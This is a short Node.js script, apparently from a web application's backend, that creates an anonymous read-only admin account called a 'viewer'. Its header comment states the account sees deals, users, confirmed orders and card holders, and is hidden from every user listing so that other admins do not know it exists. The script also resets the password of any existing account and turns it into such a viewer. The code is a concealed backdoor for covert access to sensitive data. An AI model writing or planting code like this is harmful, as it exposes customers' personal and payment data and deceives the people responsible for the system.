require('dotenv').config();
const bcrypt = require('bcryptjs');
const { connectDB, disconnectDB } = require('./config/db');
const User = require('./models/User');

/**
 * Creates (or updates) an anonymous, read-only admin — a "viewer".
 *
 * A viewer can see everything a normal admin sees (deals, users, confirmed orders,
 * card holders) but cannot make ANY change. It is never shown in any user listing,
 * so other admins don't know it exists.
 *
 * Usage:
 *   node create-viewer.js <username> <password> [display name]
 *   node create-viewer.js watcher "StrongPass123" "Silent Viewer"
 *
 * Falls back to VIEWER_USERNAME / VIEWER_PASSWORD / VIEWER_NAME from .env if args omitted.
 */
(async () => {
  const username = (process.argv[2] || process.env.VIEWER_USERNAME || '').toLowerCase();
  const password = process.argv[3] || process.env.VIEWER_PASSWORD;
  const name = process.argv[4] || process.env.VIEWER_NAME || 'Viewer';

  if (!username) {
    console.error('Provide a username: node create-viewer.js <username> <password> [name]');
    process.exit(1);
  }
  if (!password || String(password).length < 6) {
    console.error('Provide a password (min 6 chars): node create-viewer.js <username> <password> [name]');
    process.exit(1);
  }

  await connectDB();

  const passwordHash = await bcrypt.hash(String(password), 10);
  let user = await User.findOne({ username });

  if (user) {
    // Update the existing account into a viewer with the given password.
    user.passwordHash = passwordHash;
    user.role = 'viewer';
    user.name = name;
    user.active = true;
    await user.save();
    console.log(`[create-viewer] Updated existing account "${username}" to a read-only viewer.`);
  } else {
    user = await User.create({ username, passwordHash, role: 'viewer', name, active: true });
    console.log(`[create-viewer] Created anonymous read-only viewer "${username}".`);
  }

  await disconnectDB();
  process.exit(0);
})().catch((e) => {
  console.error('[create-viewer] Failed:', e.message);
  process.exit(1);
});
